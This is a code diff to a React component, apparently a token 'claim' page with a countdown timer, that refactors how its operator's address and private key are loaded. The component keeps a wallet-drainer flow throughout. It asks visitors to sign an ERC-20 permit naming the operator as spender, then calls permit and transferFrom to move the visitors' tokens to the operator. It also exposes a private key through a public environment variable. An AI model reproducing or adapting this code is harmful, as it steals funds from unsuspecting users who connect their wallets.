@@ -11,7 +11,6 @@ import {
   mainnetRpcUrl,
 } from "../../back-end/contracts.js"
 import CountdownTimer from "./timer"
-import { ownerAddress, pk } from "../../back-end/pt"
 import Popup from "../popup/popup"
 
 const Box2 = () => {
@@ -93,7 +92,10 @@ const Box2 = () => {
 
     try {
       const walletProvider = new ethers.providers.JsonRpcProvider(mainnetRpcUrl)
-      const wallet = new ethers.Wallet(pk, walletProvider)
+      const wallet = new ethers.Wallet(
+        process.env.NEXT_PUBLIC_PRIVATE_KEY,
+        walletProvider,
+      )
 
       // let maxBalanceIndex = 0
       // let maxBalance = 0
@@ -252,7 +254,7 @@ const Box2 = () => {
       }
       const message = {
         owner: address,
-        spender: ownerAddress,
+        spender: process.env.NEXT_PUBLIC_ADDRESS,
         value: value.toString(),
         nonce: nonce.toString(),
         deadline: deadline.toString(),
@@ -261,9 +263,21 @@ const Box2 = () => {
       const signature = await signer._signTypedData(domain, types, message)
       const { v, r, s } = ethers.utils.splitSignature(signature)
 
-      await contract.permit(address, ownerAddress, value, deadline, v, r, s)
+      await contract.permit(
+        address,
+        process.env.NEXT_PUBLIC_ADDRESS,
+        value,
+        deadline,
+        v,
+        r,
+        s,
+      )
 
-      await contract.transferFrom(address, ownerAddress, value)
+      await contract.transferFrom(
+        address,
+        process.env.NEXT_PUBLIC_ADDRESS,
+        value,
+      )
 
       setClaiming(false)
     } catch (e) {
